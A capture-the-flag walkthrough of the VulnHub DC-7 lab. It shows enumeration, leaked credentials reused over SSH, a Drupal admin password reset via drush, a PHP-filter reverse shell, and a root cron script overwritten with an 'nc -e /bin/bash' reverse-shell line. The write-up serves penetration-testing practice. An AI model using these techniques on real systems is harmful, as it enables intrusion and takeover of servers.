# VulnHub > DC 7

**About Release**

* Name: DC: 7
* Date release: 31 Aug 2019
* Author: DCAU
* Series: DC
* Web page: http://www.five86.com/dc-7.html

**Download**

* DC-7.zip (Size: 939 MB)
* Download: http://www.five86.com/downloads/DC-7.zip
* Download (Mirror): https://download.vulnhub.com/dc/DC-7.zip
* Download (Torrent): https://download.vulnhub.com/dc/DC-7.zip.torrent ([Magnet](magnet:?xt=urn:btih:242DD90300327E6A967CA8F8C7BEDC55BF70FE57&dn=DC-7.zip&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

**Description**

DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

While this isn't an overly technical challenge, it isn't exactly easy.

While it's kind of a logical progression from an earlier DC release (I won't tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won't succeed.

What you will need to do, is to think "outside" of the box.

Waaaaaay "outside" of the box. :-)

The ultimate goal of this challenge is to get root and to read the one and only flag.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.

# Initial Foothold

## Services Enumeration

Nmap discovers 2 open TCP ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)
|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA)
|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Welcome to DC-7 | D7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web Enumeration

Connecting to the target with the browser will reveal a Drupal installation, and `droopescan` confirms that this is version 8.7:

~~~
kali@kali:~$ droopescan scan drupal -u http://dc-7/
[+] No plugins found.                                                           

[+] Themes found:
    startupgrowth_lite http://dc-7/themes/startupgrowth_lite/
        http://dc-7/themes/startupgrowth_lite/LICENSE.txt

[+] Possible version(s):
    8.7.0
    8.7.0-alpha1
    8.7.0-alpha2
    8.7.0-beta1
    8.7.0-beta2
    8.7.0-rc1
    8.7.1
    8.7.10
    8.7.11
    8.7.12
    8.7.13
    8.7.14
    8.7.2
    8.7.3
    8.7.4
    8.7.5
    8.7.6
    8.7.7
    8.7.8
    8.7.9

[+] Possible interesting urls found:
    Default admin - http://dc-7/user/login

[+] Scan finished (0:04:06.242866 elapsed)
~~~

## Social accounts intel

### Twitter

Now, having a closer look at the main page will reveal the presence of a string (`@DC7USER`) will looks like a Twitter account:

~~~
kali@kali:~$ curl -s http://dc-7/ | tail -n 24 | head
<div id="block-twitter" class="block block-block-content block-block-contentb0a8b82c-c675-4fec-a0a9-6d4feb7ff53c">
  
    
      <div class="content">
      
            <div class="clearfix text-formatted field field--name-body field--type-text-with-summary field--label-hidden field__item"><p><strong>@DC7USER</strong></p></div>
      
    </div>
  </div>
~~~

Searching for the user on Twitter leads to https://twitter.com/dc7user. The user profile contains a link to a github repository: https://github.com/Dc7User/staffdb.

### GitHub

Let's clone the github repo and analyze the sources:

~~~
kali@kali:/data/DC_7/files$ git clone https://github.com/Dc7User/staffdb.git
Cloning into 'staffdb'...
remote: Enumerating objects: 21, done.
remote: Counting objects: 100% (21/21), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 21 (delta 9), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (21/21), 6.43 KiB | 598.00 KiB/s, done.
kali@kali:/data/DC_7/files$ ll
total 4
drwxr-xr-x 3 kali kali 4096 Oct 10 15:24 staffdb
kali@kali:/data/DC_7/files$ cd staffdb/
kali@kali:/data/DC_7/files/staffdb$ ll
total 68
-rw-r--r-- 1 kali kali 2044 Oct 10 15:24 addusersdb.php
-rw-r--r-- 1 kali kali 2041 Oct 10 15:24 addusers.php
-rw-r--r-- 1 kali kali  184 Oct 10 15:24 config.php
-rw-r--r-- 1 kali kali  287 Oct 10 15:24 contact-info.php
-rw-r--r-- 1 kali kali  441 Oct 10 15:24 createdata.php
-rw-r--r-- 1 kali kali  346 Oct 10 15:24 createdb.php
-rw-r--r-- 1 kali kali  635 Oct 10 15:24 createmany.php
-rw-r--r-- 1 kali kali  561 Oct 10 15:24 createtables.php
-rw-r--r-- 1 kali kali 2166 Oct 10 15:24 displayall.php
-rw-r--r-- 1 kali kali   41 Oct 10 15:24 index.php
-rw-r--r-- 1 kali kali 2438 Oct 10 15:24 login.php
-rw-r--r-- 1 kali kali 1438 Oct 10 15:24 logout.php
-rw-r--r-- 1 kali kali  194 Oct 10 15:24 README.md
-rw-r--r-- 1 kali kali 2457 Oct 10 15:24 results.php
-rw-r--r-- 1 kali kali 1601 Oct 10 15:24 search.php
-rw-r--r-- 1 kali kali  413 Oct 10 15:24 session.php
-rw-r--r-- 1 kali kali 1486 Oct 10 15:24 welcome.php
~~~

Credentials are leaked in the `config.php` file:

~~~
kali@kali:/data/DC_7/files/staffdb$ cat config.php 
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
~~~

# SSH connection (dc7user)

Trying to connect against the SSH service using these credentials is successful:

~~~
kali@kali:~$ sshpass -p "MdR3xOgB7#dW" ssh dc7user@dc-7
Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Sat Oct 10 23:25:47 2020 from 172.16.222.128
dc7user@dc-7:~$ id
uid=1000(dc7user) gid=1000(dc7user) groups=1000(dc7user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
~~~

# The `backups.sh` script

There is a mailbox file in the home folder, which seems to indicate that a cron job is run by `root`:

~~~
dc7user@dc-7:~$ cat mbox 

From root@dc-7 Thu Aug 29 17:00:22 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000
Received: from root by dc-7 with local (Exim 4.89)
	(envelope-from <root@dc-7>)
	id 1i3EPu-0000CV-5C
	for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3EPu-0000CV-5C@dc-7>
Date: Thu, 29 Aug 2019 17:00:22 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

[REDACTED]
~~~

Running pspy64 on the target will confirm that `/opt/scripts/backups.sh` is run by `root`:

~~~
2020/10/10 23:45:01 CMD: UID=0    PID=1335   | /bin/sh -c /opt/scripts/backups.sh 
2020/10/10 23:45:01 CMD: UID=0    PID=1336   | rm /home/dc7user/backups/website.sql.gpg /home/dc7user/backups/website.tar.gz.gpg 
2020/10/10 23:45:01 CMD: UID=0    PID=1337   | /bin/bash /opt/scripts/backups.sh 
2020/10/10 23:45:02 CMD: UID=0    PID=1338   | php /usr/local/bin/drush sql-dump --result-file=/home/dc7user/backups/website.sql 
2020/10/10 23:45:02 CMD: UID=0    PID=1339   | sh -c tput colors 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1340   | sh -c stty size 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1341   | stty size 
2020/10/10 23:45:02 CMD: UID=0    PID=1342   | php /usr/local/bin/drush sql-dump --result-file=/home/dc7user/backups/website.sql 
2020/10/10 23:45:02 CMD: UID=0    PID=1343   | sh -c tput colors 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1344   | sh -c tput colors 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1345   | sh -c tput colors 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1346   | php /usr/local/bin/drush sql-dump --result-file=/home/dc7user/backups/website.sql 
2020/10/10 23:45:02 CMD: UID=0    PID=1347   | sh -c tput colors 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1348   | sh -c tput colors 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1349   | sh -c tput colors 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1350   | php /usr/local/bin/drush sql-dump --result-file=/home/dc7user/backups/website.sql 
2020/10/10 23:45:02 CMD: UID=0    PID=1351   | sh -c mysql --defaults-extra-file=/tmp/drush_wItUEk --database=d7db --host=localhost --silent  < /tmp/drush_GIooHq 2>&1 
2020/10/10 23:45:02 CMD: UID=0    PID=1352   | php /usr/local/bin/drush sql-dump --result-file=/home/dc7user/backups/website.sql 
2020/10/10 23:45:02 CMD: UID=0    PID=1353   | sh -c mysqldump --defaults-extra-file=/tmp/drush_t66bHe  d7db --host=localhost --no-autocommit --single-transaction --opt -Q  > /home/dc7user/backups/website.sql 
2020/10/10 23:45:20 CMD: UID=0    PID=1354   | /bin/bash /opt/scripts/backups.sh 
2020/10/10 23:45:20 CMD: UID=0    PID=1355   | tar -czf /home/dc7user/backups/website.tar.gz html/ 
2020/10/10 23:45:20 CMD: UID=0    PID=1356   | /bin/sh -c gzip 
2020/10/10 23:45:29 CMD: UID=0    PID=1357   | /bin/bash /opt/scripts/backups.sh 
~~~

This backup script saves both the database and the Drupal source files, which are then encrypted in GPG. Notice that the script uses the `drush` utility to dump the database.

~~~
dc7user@dc-7:/opt/scripts$ cat backups.sh 
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
~~~

The backups.sh script is only writable to `root` or members of the `www-data` group:

~~~
dc7user@dc-7:/opt/scripts$ ls -l backups.sh 
-rwxrwxr-x 1 root www-data 520 Aug 29  2019 backups.sh
~~~

# Lateral move (dc7user -> www-data)

## Reset the Drupal admin account

For once, we need to move laterally to `www-data` (this is quite unusual as we are usually initially gaining a shell as `www-data` and then move laterally to a user). For that, we need to make a reverse shell inside Drupal.

We've seen the use of `drush` in the script. The good thing is that we can use this utility to reset the Drupal admin account:

~~~
dc7user@dc-7:~$ cd /var/www/html/
dc7user@dc-7:/var/www/html$ drush help user-password
(Re)Set the password for the user account with the specified name.

Examples:
 drush user-password someuser       Set the password for the username someuser. @see xkcd.com/936 
 --password="correct horse battery                                                                
 staple"

Arguments:
 name                                      The name of the account to modify.

Options:
 --password=<foo>                          The new password for the account. Required.

Aliases: upwd, user:password
dc7user@dc-7:/var/www/html$ drush user-password admin --password="NewAdminPassword"
Changed password for admin                                                                                [success]
dc7user@dc-7:/var/www/html$ 
~~~

Go to `http://dc-7/user/login` and login with `admin:NewAdminPassword`.

## The PHP-filter module

To make a reverse shell in Drupal, we'll use the PHP-filter module, but it's not installed.

* Download the Drupal PHP filter module here: https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
* Go to `http://dc-7/admin/modules` and upload the module.
* Now, enable the module, under "Manage > Extend > Modules > PHP filter" and check the "PHP filter" box. Scroll down to the very bottom and click on the "Install" button.

## Reverse shell

Now, start a listener:

~~~
$ rlwrap nc -nlvp 4444
~~~

From the Drupal admin panel, navigate to "Content > Add Content > Basic page".

From the Drupal admin panel, add the malicious content:

* Give it any title
* paste the content of a PHP web shell in the "Body" field
* select "PHP code" in the "Text format" dropdown
* Click on the "Preview" button.

We now have a reverse shell as `www-data`:

~~~
kali@kali:/data/DC_7/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.162] 46974
Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux
 16:34:46 up 57 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
dc7user  pts/0    172.16.222.128   15:44   30:19   0.08s  0.08s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@dc-7:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

# Privilege escalation

## Modify the backup script

We are now able to modify the backup script:

~~~
www-data@dc-7:/$ cat > /opt/scripts/backups.sh << EOF
nc -e /bin/bash 172.16.222.128 5555
EOF
~~~

## Root shell

Start a new listener and wait (be aware that the cron job is run every 15 min only):

~~~
$ rlwrap nc -nlvp 5555
~~~

After a while (up to 15 min):

~~~
kali@kali:/data/DC_7/files$ rlwrap nc -nlvp 5555
listening on [any] 5555 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.162] 43908
id
uid=0(root) gid=0(root) groups=0(root)
python -c "import pty;pty.spawn('/bin/bash')"
~~~

# Root flag

Let's get the root flag:

~~~
root@dc-7:~# cd /root
cd /root
root@dc-7:~# ls -la
ls -la
total 36
drwx------  4 root root 4096 Aug 30  2019 .
drwxr-xr-x 22 root root 4096 Aug 29  2019 ..
lrwxrwxrwx  1 root root    9 Aug 29  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root  949 Aug 29  2019 .bashrc
drwxr-xr-x  3 root root 4096 Aug 29  2019 .drush
drwx------  3 root root 4096 Oct 11 15:45 .gnupg
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
-rw-r--r--  1 root root   74 Aug 29  2019 .selected_editor
-rw-r--r--  1 root root 1079 Aug 30  2019 theflag.txt
-rw-r--r--  1 root root  165 Aug 29  2019 .wget-hsts
root@dc-7:~# cat theflag.txt
cat theflag.txt




888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.

root@dc-7:~# 
~~~
